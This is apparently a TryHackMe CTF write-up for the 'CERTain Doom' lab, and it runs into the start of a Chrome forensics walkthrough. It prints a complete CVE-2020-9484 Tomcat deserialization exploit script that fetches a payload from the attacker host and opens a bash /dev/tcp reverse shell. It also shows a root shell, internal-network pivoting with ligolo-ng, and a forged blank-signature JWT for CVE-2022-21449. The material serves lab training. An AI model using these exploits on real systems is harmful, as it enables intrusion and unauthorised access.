(RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI9RmMphpZ0uukrNxPj8ojeRdQF3nTPgufa6bqShoWI9Sfs78koCvg+oYL2dz+o+JU34j7kbNnzqrlkvG2piLgjGa/nzZbUVpiAk85TGSrltb2H9p6ORqTXmgnFNitwynoz8tI0XqIBxuQm801hEYBOYFdEqRp8pPLkbDI8gDUJCtk8Ta+v189AXvIBragn4jPcXS7wbX61csUr7jGjneln9hybY4GC/cmHMIF2sYCzHbDuwl7bC4QVf8Qd1DNknR0f7pPGillIa76d4c+10pF83kv4QjZf3WRdytNo6psqg9VH2Kz6AWpPn9z6aWTanONQzl3HdP8mzBzsUA76ZPh/IgNQDrCJTmM9SX4z2n60+aqlPo6PjvM8XxSu/XvPsvzpL+CABmz+k2ziCmd+nQ0tJrpIwUFTpb/82ZbGSDtFNNm35vsL++R5yHodU0jvb0Yq8blpUu4vh7Pzuiryk2H7HgjYcj1FmPwGvv+HpdY+uPQwuIA9xe2bnxZ8BW7LKE= | 256 cc:55:d5:72:1d:be:03:85:d5:7e:3e:1a:d6:72:2c:2c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLig4AYdXAxFRwdUHHUtXGkdr3GFGGM83WssnCjyrU1deeFT1BDuit5NI+7nEqVl0BeSSU3LRpHeLpSIYiugxC0= | 256 08:34:3b:e0:5d:d1:37:d4:68:28:6b:cf:e2:f1:53:ed (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINFfDent94JxaXvMValeP9zIhJO8/mj/WFtHqGkUsv4X 80/tcp open http syn-ack ttl 59 hastatic-1.0.0 |_http-server-header: hastatic-1.0.0 | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.0 200 OK | Content-Length: 117674 | Accept-Ranges: bytes | Date: Sat, 14 Sep 2024 03:00:00 GMT | Server: hastatic-1.0.0 | Content-Type: text/html | Cache-Control: no-transform,public,max-age=300,s-maxage=900 | Last-Modified: Thu, 26-Jan-2023 22:44:29 UTC | ETag: 98eb1c6fb079742e0b8682cb642c5c777329ebbe | Vary: Accept-Encoding | Referrer-Policy: strict-origin-when-cross-origin | X-Frame-Options: SAMEORIGIN | X-XSS-Protection: 1; mode=block | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Super Secret Admin Page\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta property=\u0026#34;og:title\u0026#34; content=\u0026#34;Hydra\u0026#39;s Super Secret Admin Page\u0026#34;\u0026gt; | \u0026lt;meta property=\u0026#34;og:type\u0026#34; content=\u0026#34;website\u0026#34;\u0026gt; | \u0026lt;meta property=\u0026#34;og:url\u0026#34; content=\u0026#34;https://admin.certain-doom.thm\u0026#34;\u0026gt; |_ \u0026lt;meta property=\u0026#34;og:image\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Super Secret Admin Page |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D 8080/tcp open http-proxy syn-ack ttl 59 Apache Tomcat 9? |_http-title: HTTP Status 404 \\xE2\\x80\\x93 Not Found |_http-server-header: Apache Tomcat 9? | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Sat, 14 Sep 2024 03:00:00 GMT | Connection: close | Server: Apache Tomcat 9? | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 404 | Found\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 404 | Found\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Sat, 14 Sep 2024 03:00:00 GMT | Connection: close | Server: Apache Tomcat 9? | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 158.30 seconds Raw packets sent: 7 (284B) | Rcvd: 4 (172B) We got 3 active ports: 22, 80 and 8080.\ncertain-doom.thm Initially found an js animation and redirected to the youtube video.\ncertain-doom.thm:8080 404 error on port 8080.\nPath Discovery by fuzzing ffuf -c -u http://certain-doom.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -fs 1054 ________________________________________________ .htaccess [Status: 200, Size: 50504, Words: 11960, Lines: 1226, Duration: 195ms] favicon.ico [Status: 200, Size: 766, Words: 8, Lines: 2, Duration: 156ms] robots.txt [Status: 200, Size: 78, Words: 8, Lines: 6, Duration: 191ms] No useful results found here.\nffuf -c -u http://certain-doom.thm:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt ________________________________________________ reports [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 156ms] ffuf -c -u http://certain-doom.thm:8080/reports/FUZZ -w /usr/share/wordlists/dirb/big.txt ________________________________________________ css [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4827ms] upload [Status: 405, Size: 449, Words: 34, Lines: 1, Duration: 342ms] Found an interesting result /reports/.\n8080:reports/ /reports page /reports/ page which in port 8080.\nerror when clicking upload An error occurs when the upload button is clicked without choosing a file.\nresponse on uploading a file Obtaining the file's destination path after upload.\nCVE-2020-9484 Google search with known factors Based on our initial Google search, we\u0026rsquo;ve discovered a potential exploit. We\u0026rsquo;ll need to validate it through further testing.\n#!/bin/bash # Exploit Title: Apache Tomcat RCE by deserialization # CVE-ID: CVE-2020-9484 # Tested on: Kali Linux # Remote Code Execution by Deserialization # your attacker IP, set to your own IP address if [ \u0026#34;$#\u0026#34; -ne 3 ]; then echo \u0026#34;#Usage: ./CVE-2020-9484 \u0026lt;target_ip\u0026gt; \u0026lt;local_ip\u0026gt; \u0026lt;local_port\u0026gt; \u0026#34; exit 1 fi # optional: target_ip=\u0026#34;$1\u0026#34; target_port=8080\tremote_ip=\u0026#34;$2\u0026#34; port=\u0026#34;$3\u0026#34; if [ -z \u0026#34;$1\u0026#34; ] || [ \u0026#34;$1\u0026#34; = \u0026#34;--help\u0026#34; ] || [ \u0026#34;$1\u0026#34; = \u0026#34;-h\u0026#34; ]; then echo \u0026#34;\u0026#34; echo \u0026#34;$(tput setaf 3;tput bold)usage: ./CVE-2020-9484.sh target-ip\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;$(tput setaf 4;tput bold)Please start a web listener in /tmp folder:\u0026#34; echo \u0026#34;$(tput setaf 3;tput bold)python3 -m http.server 80\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;$(tput setaf 4;tput bold)and start your netcat listener at port 4444:\u0026#34; echo \u0026#34;$(tput setaf 3;tput bold)nc -nvlp 4444\u0026#34; exit\tfi # look for ysoserial file on your attacker system # check out install.txt file for instructions how to install ysoserial find_ysoserial_on_system(){ echo \u0026#34;$(tput setaf 6;tput bold)[+] Checking if you have installed ysoserial..\u0026#34; sleep 1 ysoserial_file=$(find / -name \u0026#34;ysoserial-master.jar\u0026#34; -type f 2\u0026gt;/dev/null) if [ -z \u0026#34;$ysoserial_file\u0026#34; ]; then echo \u0026#34;$(tput setaf 1;tput bold)You need ysoserial-master.jar in order to use this script!\u0026#34; echo \u0026#34;$(tput setaf 1;tput bold)Please make sure to follow the install.txt guide!\u0026#34; echo \u0026#34;$(tput setaf 1;tput bold)Quitting..\u0026#34; exit fi echo \u0026#34;$(tput setaf 5;tput bold)[+] Found ysoserial-master.jar!\u0026#34; } # creating payload files using ysoserial create_payload_files(){ echo \u0026#34;$(tput setaf 6;tput bold)[+] Trying to create payload files..\u0026#34; sleep 1 echo \u0026#34;$(tput setaf 6;tput bold)[+] Creating payload.sh file..\u0026#34; rm -rf payload.sh echo \u0026#34;#!/usr/bin/bash\u0026#34; \u0026gt;\u0026gt; payload.sh echo \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/$remote_ip/$port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; payload.sh sleep 1 echo \u0026#34;$(tput setaf 5;tput bold)[+] Finished!\u0026#34; echo \u0026#34;$(tput setaf 6;tput bold)[+] Trying to create first ysoserial payload file\u0026#34; sleep 1 java -jar $ysoserial_file CommonsCollections2 \u0026#34;curl http://$remote_ip/payload.sh -o /tmp/payload.sh\u0026#34; \u0026gt; downloadPayload.session echo \u0026#34;$(tput setaf 5;tput bold)[+] Finished!\u0026#34; echo \u0026#34;$(tput setaf 6;tput bold)[+] Trying to create second ysoserial payload file\u0026#34; sleep 1 java -jar $ysoserial_file CommonsCollections2 \u0026#34;chmod 777 /tmp/payload.sh\u0026#34; \u0026gt; chmodPayload.session echo \u0026#34;$(tput setaf 5;tput bold)[+] Finished!\u0026#34; echo \u0026#34;$(tput setaf 6;tput bold)[+] Trying to create last ysoserial payload file\u0026#34; sleep 1 java -jar $ysoserial_file CommonsCollections2 \u0026#34;bash /tmp/payload.sh\u0026#34; \u0026gt; executePayload.session echo \u0026#34;$(tput setaf 5;tput bold)[+] Finished!\u0026#34; echo trying to create getting file sleep 1 echo \u0026#34;$(tput setaf 2;tput bold)----------------------------------------------------------------\u0026#34; echo \u0026#34;$(tput setaf 4;tput bold)[+] Succesfully created all files!\u0026#34; echo \u0026#34;$(tput setaf 2;tput bold)----------------------------------------------------------------\u0026#34; sleep 1 } #get a reverse shell get_reverse_shell(){ echo \u0026#34;[+] Trying to get a reverse shell..\u0026#34; echo \u0026#34;[+] Make sure to have netcat and python weblistener in current folder running..\u0026#34; curl http://$target_ip:$target_port/reports/upload -F \u0026#39;file=@downloadPayload.session\u0026#39; sleep 1 curl http://$target_ip:$target_port/reports/ -H \u0026#39;Cookie: JSESSIONID=../../../../../../../../../../../../../../../../usr/local/tomcat/temp/uploads/downloadPayload\u0026#39; sleep 1 curl http://$target_ip:$target_port/reports/upload -F \u0026#39;file=@chmodPayload.session\u0026#39; curl http://$target_ip:$target_port/reports/upload -H \u0026#39;Cookie:JSESSIONID=../../../../../../../../../../../usr/local/tomcat/temp/uploads/chmodPayload\u0026#39; sleep 1 curl http://$target_ip:$target_port/reports/upload -F \u0026#39;file=@executePayload.session\u0026#39; curl http://$target_ip:$target_port/reports/upload -H \u0026#39;Cookie:JSESSIONID=../../../../../../../../../../../usr/local/tomcat/temp/uploads/executePayload\u0026#39; echo \u0026#34;\u0026#34; echo \u0026#34;$(tput setaf 5;tput bold)[+] Finished!\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;$(tput setaf 4;tput bold)[+] If you don\u0026#39;t have a reverse shell, try to run it again!\u0026#34; } # start RCE exploit find_ysoserial_on_system create_payload_files get_reverse_shell The provided Bash script is a modified version of PenTestical\u0026rsquo;s CVE-2020-9484 exploit , designed to function effectively with our specific target.\nsudo apt-get install openjdk-11-jdk sudo update-alternatives --config java This code snippet is used to install Java 11 on Ubuntu-based systems and configure it as the default Java environment.\n$ nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.11.11] from (UNKNOWN) [10.10.50.246] 50344 bash: no job control in this shell bash-4.2# id id uid=0(root) gid=0(root) groups=0(root) We obtained a root shell here.\nbash-4.2# cat /usr/local/tomcat/.flag cat /usr/local/tomcat/.flag THM{FLAG_1_REDACTED} We found our first hidden flag.\nPenetrating Internal Network Better shell python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got better shell by running the above commands.\nbash-4.2# curl http://10.10.11.11/linpeas.sh \u0026gt; linpeas.sh bash-4.2# chmod +x linpeas.sh bash-4.2# ./linpeas.sh Linpeas.sh uncovered potentially risky entries in the /etc/hosts file. We are inside docker container.\n/etc/hosts bash-4.2# cat /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.20.0.4 2c5b93ea49de 172.18.0.3 2c5b93ea49de Two IP addresses, 172.20.0.4 and 172.18.0.3, were found in the /etc/hosts file. These addresses likely indicate a connection to the internal network.\nnmap A pre-compiled network scanner (static nmap) was retrieved and transferred to the target system for further analysis.\ncurl http://10.10.11.11/nmap -o /tmp/nmap chmod +x /tmp/nmap Downloading and making a standalone network scanner executable for discreet reconnaissance\nFirst Network\nbash-4.2# /tmp/nmap -sn 172.20.0.4/16 Starting Nmap 6.49BETA1 ( http://nmap.org ) Stats: 0:00:08 elapsed; 0 hosts completed (0 up), 4096 undergoing ARP Ping Scan Nmap scan report for ip-172-20-0-1.eu-west-1.compute.internal (172.20.0.1) Host is up (0.000051s latency). MAC Address: 02:42:4A:AF:77:20 (Unknown) Nmap scan report for cert_library_1.cert_cert-internal (172.20.0.2) Host is up (0.000014s latency). MAC Address: 02:42:AC:14:00:02 (Unknown) Nmap scan report for cert_library-back_1.cert_cert-internal (172.20.0.3) Host is up (0.000052s latency). MAC Address: 02:42:AC:14:00:03 (Unknown) Nmap scan report for 2c5b93ea49de (172.20.0.4) Host is up. bash-4.2# /tmp/nmap -p- --min-rate 5000 172.20.0.1 Nmap scan report for ip-172-20-0-1.eu-west-1.compute.internal (172.20.0.1) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open webcache bash-4.2# /tmp/nmap -p- --min-rate 5000 172.20.0.2 Starting Nmap 6.49BETA1 ( http://nmap.org ) Nmap scan report for cert_library_1.cert_cert-internal (172.20.0.2) PORT STATE SERVICE 80/tcp open http\tbash-4.2# /tmp/nmap -p- --min-rate 5000 172.20.0.3 Starting Nmap 6.49BETA1 ( http://nmap.org ) Nmap scan report for cert_library-back_1.cert_cert-internal (172.20.0.3) PORT STATE SERVICE 8080/tcp open webcache bash-4.2# /tmp/nmap -p- --min-rate 5000 172.20.0.4 Nmap scan report for 2c5b93ea49de (172.20.0.4) PORT STATE SERVICE 8080/tcp open webcache The IP addresses 172.20.0.2 and 172.20.0.3 were identified as potential points of interest within the internal network.\nSecond Network.\nbash-4.2# /tmp/nmap -sn 172.18.0.3/16 Nmap scan report for ip-172-18-0-1.eu-west-1.compute.internal (172.18.0.1) Host is up (0.000031s latency). MAC Address: 02:42:11:FA:35:62 (Unknown) Nmap scan report for cert_admin_1.cert_cert-frontend (172.18.0.2) Host is up (0.000035s latency). MAC Address: 02:42:AC:12:00:02 (Unknown) Nmap scan report for 2c5b93ea49de (172.18.0.3) Host is up. bash-4.2# /tmp/nmap -p- --min-rate 5000 172.18.0.1 Nmap scan report for ip-172-18-0-1.eu-west-1.compute.internal (172.18.0.1) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open webcache bash-4.2# /tmp/nmap -p- --min-rate 5000 172.18.0.2 Nmap scan report for cert_admin_1.cert_cert-frontend (172.18.0.2) PORT STATE SERVICE 3000/tcp open hbci bash-4.2# /tmp/nmap -p- --min-rate 5000 172.18.0.3 Nmap scan report for 2c5b93ea49de (172.18.0.3) PORT STATE SERVICE 8080/tcp open webcache Here interesting ip is 172.18.0.2.\nLet\u0026rsquo;s dive into the 172.20.0.* network!\nligolo-ng tunneling Implementing a secure tunneling solution with Ligolo-NG . Acquiring the necessary agent and proxy components.\n# Add a tun interface named \u0026#34;ligolo\u0026#34; sudo ip tuntap add user kali mode tun ligolo # Set the interface up sudo ip link set ligolo up # Add a static route to 240.0.0.1 via the ligolo interface sudo ip route add 240.0.0.1 dev ligolo # Add a static route for the 172.18.0.0/16 network via the ligolo interface sudo ip route add 172.18.0.0/16 dev ligolo # Add a static route for the 172.20.0.0/16 network via the ligolo interface sudo ip route add 172.20.0.0/16 dev ligolo Established a new route.\n./proxy -selfcert Initiating the listener on the attacker\u0026rsquo;s machine.\ncurl http://10.10.11.11:8000/agent -o /tmp/agent chmod +x /tmp/agent /tmp/agent -connect 10.10.11.11:11601 -ignore-cert Launching the agent.\nligolo-ng connection Agent successfully established a connection with the proxy.\nlibrary 172.20.0.2:80 Let\u0026rsquo;s use Burp Suite to analyze the requests and responses of a web page.\nBurp-suite: GET - 172.20.0.2:80 The request to the IP address 172.20.0.2 resulted in a 403 CORS error due to an invalid origin. The expected host library-back should be mapped to 172.20.0.3, while library should be mapped to 172.20.0.2.\necho \u0026#34;172.20.0.2 library\u0026#34; \u0026gt;\u0026gt; /etc/hosts echo \u0026#34;172.20.0.3 library-back\u0026#34; \u0026gt;\u0026gt; /etc/hosts Successfully added the host mappings.\nBurp-suite: repeater Modifying the referrer and origin headers resulted in a 401 Unauthorized response. Let\u0026rsquo;s attempt to access the resource at http://library/ directly from the web browser.\nlibrary/login We got a simple login page here.\nburp-suite - POST library-back:8080/j_security_check We are getting 401 Unauthorized error when trying to sign in.\nLets fuzz this.\n$ ffuf -c -u http://library/FUZZ -w /usr/share/wordlists/dirb/big.txt robots.txt [Status: 200, Size: 64, Words: 3, Lines: 3, Duration: 524ms] sitemap.xml [Status: 200, Size: 152, Words: 4, Lines: 4, Duration: 361ms] $ ffuf -c -u http://library-back:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt documents [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 209ms] Let\u0026rsquo;s examine the sitemap and robots.txt files.\n$ curl http://library/robots.txt Disallow: Sitemap: https://myapp.local/sitemap.xml $ curl http://library/sitemap.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;urlset xmlns=\u0026#34;http://www.sitemaps.org/schemas/sitemap/0.9\u0026#34;\u0026gt; \u0026lt;url\u0026gt;\u0026lt;loc\u0026gt;https://myapp.local/\u0026lt;/loc\u0026gt;\u0026lt;/url\u0026gt; \u0026lt;/urlset\u0026gt; The previous analysis did not yield any significant findings.\nlogin as bob user Using the credentials bob for username and password, we successfully logged in. A cookie named credz was set upon login. Let\u0026rsquo;s attempt to utilize this cookie in our request to http://learn-back:8080/documents.\ncurl -X POST -d \u0026#34;j_username=bob\u0026amp;j_password=bob\u0026#34; http://library-back:8080/j_security_check -i Upon successful login, a cookie will be set in the response.\nlearn-back:8080/documents The request with the included cookie successfully authenticated, resulting in a 200 OK response.\nhint for a flag During further testing, we encountered an intriguing finding. Our next step is to devise a method for downloading these files.\nBurpsuite - HttpHistory The webpage relies on numerous JavaScript scripts for its functionality. Let\u0026rsquo;s delve into these scripts using the developer tools in Firefox.\np-dc627881.entry.js - download_file_uri The URL for downloading files is http://library-back:8080/documents/download/filename. Let\u0026rsquo;s employ the curl command to retrieve the necessary files.\ncurl \u0026#34;http://library-back:8080/documents/download/flagz.docx\u0026#34; -H \u0026#34;Cookie: credz=$cookie\u0026#34; -o flagz.docx The following command successfully downloads the flagz.docx file using the provided cookie.\nthe flag! HAHA!!! The filename was misleading. I recall noticing other intriguing filenames as well.\n$ curl \u0026#34;http://library-back:8080/documents?Hidden=true\u0026#34; -H \u0026#34;Cookie: credz=$cookie\u0026#34; | jq [ { \u0026#34;id\u0026#34;: \u0026#34;64d35510774649ab3562697f\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Todo\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;bob\u0026#34;, \u0026#34;filename\u0026#34;: \u0026#34;todo.md\u0026#34;, \u0026#34;hidden\u0026#34;: true, \u0026#34;created\u0026#34;: \u0026#34;2022-05-02T13:31:13.495\u0026#34;, \u0026#34;modified\u0026#34;: \u0026#34;2023-08-04T08:27:44.168\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;64d35510774649ab35626980\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Chat Logs\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;bob\u0026#34;, \u0026#34;filename\u0026#34;: \u0026#34;chat.log\u0026#34;, \u0026#34;hidden\u0026#34;: true, \u0026#34;created\u0026#34;: \u0026#34;2023-08-09T09:02:13.028\u0026#34;, \u0026#34;modified\u0026#34;: \u0026#34;2023-08-09T09:02:13.028\u0026#34; } ] Two potentially valuable files have been identified: todo.md and chat.log. These filenames suggest they may contain sensitive information.\ncurl \u0026#34;http://library-back:8080/documents/download/todo.md\u0026#34; -H \u0026#34;Cookie: credz=$cookie\u0026#34; -o todo.md curl \u0026#34;http://library-back:8080/documents/download/chat.log\u0026#34; -H \u0026#34;Cookie: credz=$cookie\u0026#34; -o chat.log Having successfully downloaded the files, let\u0026rsquo;s examine their contents.\n$ cat todo.md \u0026amp;\u0026amp; echo \u0026amp;\u0026amp; echo ============*****============ \u0026amp;\u0026amp; cat chat.log # Bob\u0026#39;s Todo List * [ ] Fix CVE-2020-9484 on Reports * [x] Get next month\u0026#39;s pentesting schedule ready * [ ] Talk to the SOC about brute force detection * [ ] Fix authentication issues in the docs library * [x] Don\u0026#39;t show hidden files for users who aren\u0026#39;t logged in * [x] Check for SQL injection in the library backend # Notes: - All good for client X\u0026#39;s pentest! - Shouldn\u0026#39;t be any SQL injection now, we\u0026#39;re using a proper framework. ============*****============ [2023-08-08 18:53] Bob: Hey do you have the specs for the tokens? [2023-08-08 18:53] Hydra: It\u0026#39;s a standard JWT, no? [2023-08-08 18:54] Bob: Yeah, but what claims should we use? [2023-08-08 18:54] Hydra: Just use the standard framework auth. [2023-08-08 18:55] Hydra: Oh right, the algorithm you\u0026#39;re using has a major vulnerability though, you might want to update that or at least patch your Java. [2023-08-08 18:56] Bob: I\u0026#39;ll get on that soon; we\u0026#39;re just an internal service anyways, the firewall\u0026#39;ll protect us. [2023-08-08 18:57] Hydra: Can\u0026#39;t always rely on that, Bob. Best be as secure as we can internally as well. [2023-08-08 18:58] Bob: Right, before I forget, here\u0026#39;s the flag for next week\u0026#39;s security conf: THM{FLAG_2_REDACTED} Final Flag Based on the discovered data and the provided hint supersonic subatomic, let\u0026rsquo;s begin enumerating potential vulnerabilities. Our analysis of the chat and todo list has identified the following issues:\nCVE-2020-9484: A known vulnerability. Brute force detection: A potential security concern. Authentication issues: Problems with the documentation library. JWT vulnerability: The use of JWT with an unpatched or outdated Java implementation poses a risk. CVE-2022-21449 Hint from AI Here are some noteworthy findings related to CVE-2022-21449 from online research.\nQUARKUS | security-jwt PortSwigger | JWT CVE-2022-21449: Psychic Signatures in Java - Neil Madden NaInSec/CVE-PoC-in-GitHub/CVE-2022-21449 davwwwx/CVE-2022-21449 security-labs-pocs/proof-of-concept-exploits/jwt-null-signature-vulnerable-app Mateusz Rędzia | exploiting-jwt-token-vulnerability-in-hackthebox-scenario JWT.IO CVE-2022-21449: The \u0026ldquo;Psychic Signatures\u0026rdquo; Vulnerability\nCVE-2022-21449 refers to a critical vulnerability in Java’s implementation of elliptic curve cryptography (ECC) that affects the ECDSA (Elliptic Curve Digital Signature Algorithm) signature verification. This flaw allows an attacker to bypass authentication and signature verification checks by exploiting improperly implemented elliptic curve signatures, often referred to as \u0026ldquo;psychic signatures.\u0026rdquo; The vulnerability impacts Oracle’s Java SE versions 7, 8, 11, and 17 and is rated with a high CVSS score due to its potential to compromise secure communications.\nimport java.security.*; // Generate a key pair using the Elliptic Curve algorithm var keys = KeyPairGenerator.getInstance(\u0026#34;EC\u0026#34;).generateKeyPair(); // Create a blank signature byte array of size 64 var blankSignature = new byte[64]; // Get a Signature instance for SHA-256 with ECDSA in P1363 format var sig = Signature.getInstance(\u0026#34;SHA256WithECDSAInP1363Format\u0026#34;); // Initialize the Signature object for verification with the public key sig.initVerify(keys.getPublic()); // Update the Signature object with the data to verify sig.update(\u0026#34;Hello, World\u0026#34;.getBytes()); // Verify the signature using the blank signature sig.verify(blankSignature); This code generates an Elliptic Curve key pair, prepares to verify a signature for the message \u0026ldquo;Hello, World\u0026rdquo; using a blank signature, and initializes the signature verification process. sig.verify(blankSignature) will return true in vulnerable (before Java CPU patch) version.\n$ echo -ne \u0026#34;MAYCAQACAQA\u0026#34; | base64 -d | openssl asn1parse -inform der 0:d=0 hl=2 l= 6 cons: SEQUENCE 2:d=1 hl=2 l= 1 prim: INTEGER :00 5:d=1 hl=2 l= 1 prim: INTEGER :00 The above result indicates that the decoded data is an ASN.1 SEQUENCE containing two INTEGER values, both of which are 00.\nCracking the JWT token\u0026rsquo;s algorithm is a complex challenge. We may need to experiment with various approaches to obtain a valid token.\nimport json, base64 header = {\u0026#34;alg\u0026#34;: \u0026#34;ES256\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;} payload = {\u0026#34;sub\u0026#34;: \u0026#34;hydra\u0026#34;, \u0026#34;groups\u0026#34;: [\u0026#34;user\u0026#34;]} def encode(data): return base64.urlsafe_b64encode(json.dumps(data, separators=(\u0026#39;,\u0026#39;, \u0026#39;:\u0026#39;)).encode()).decode().rstrip(\u0026#39;=\u0026#39;) token = f\u0026#39;{encode(header)}.{encode(payload)}.MAYCAQACAQA\u0026#39; print(token) The provided code will generate a valid JWT token for authorization, with the claims sub and groups.\n$ curl http://library-back:8080/documents?hidden=true -H \u0026#34;Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoeWRyYSIsImdyb3VwcyI6WyJ1c2VyIl19.MAYCAQACAQA\u0026#34; | jq [ { \u0026#34;id\u0026#34;: \u0026#34;64d35510774649ab35626981\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Specifications for Document Library\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;hydra\u0026#34;, \u0026#34;filename\u0026#34;: \u0026#34;specs.pdf\u0026#34;, \u0026#34;hidden\u0026#34;: true, \u0026#34;created\u0026#34;: \u0026#34;2022-10-25T17:30:24.34\u0026#34;, \u0026#34;modified\u0026#34;: \u0026#34;2023-10-25T17:30:24.34\u0026#34; } ] Having successfully authenticated as the user hydra, we discovered a hidden file.\ncurl http://library-back:8080/documents/download/specs.pdf -H \u0026#34;Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoeWRyYSIsImdyb3VwcyI6WyJ1c2VyIl19.MAYCAQACAQA\u0026#34; -o specs.pdf The hidden file was successfully downloaded and saved as specs.pdf.\nFalse flag Upon further analysis of the specs.pdf file using a PDF reader, we discovered another misleading clue.\n$ pdftotext specs.pdf specs.txt $ rg -o THM specs.txt 163:THM{FLAG} 177:THM{FALSE_FLAG} The final flag was successfully obtained by executing the specified commands.\nWe solved the lab.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/certaindoom/writeup/","tags":["Deserialization-Vulnerability","CVE-2020-9484","static-nmap","ligolo-ng","tunneling","CVE-2022-21449","JWT","java","Psychic Signatures","ffuf","curl"],"title":"CERTain Doom | THM Writeup"},{"categories":["CTF","Forensic"],"content":"Introduction Detailed walkthroughs for Chrome CTF challenges on TryHackMe .\nDescription A password manager is only as strong as the password that encrypts it. You find that a malicious actor extracted something over the network, but what? Help us find out!\n1.What is the first password that we find? 2.What is the URL found in the first index? Fully defang the URL 3.What is the password found in the first index? 4.What is the URL found in the second index? Fully defang the URL 5.What is the password found in the second index? From the above questions, we assume that will find the paswords and urls using the task file.\nEnumaration We downloaded the task file from Chrome|THM page, and unzipped it. We got a .pcapng file.\n-rw-r--r-- 1 root root 73M Mar 18 21:36 chromefiles-1697949492677.zip -rwxr-xr-x 1 root root 73M Oct 22 2023 traffic.pcapng Wireshark Wireshark:traffic.pcapng Protocol Hieraracy By checking Statics --\u0026gt; Protocol Hieraracy, we have SMB data in the captured file.\nExport- SMB objects list We got the interesting files to be extracted.\n-rw-r--r-- 1 root root 72M Aug 18 22:33 encrypted_files -rw-r--r-- 1 root root 160 Aug 18 22:36 srvsvc -rw-r--r-- 1 root root 5.5K Aug 18 22:36 transfer.exe ILSpy Lets try to get more information from these files, start with 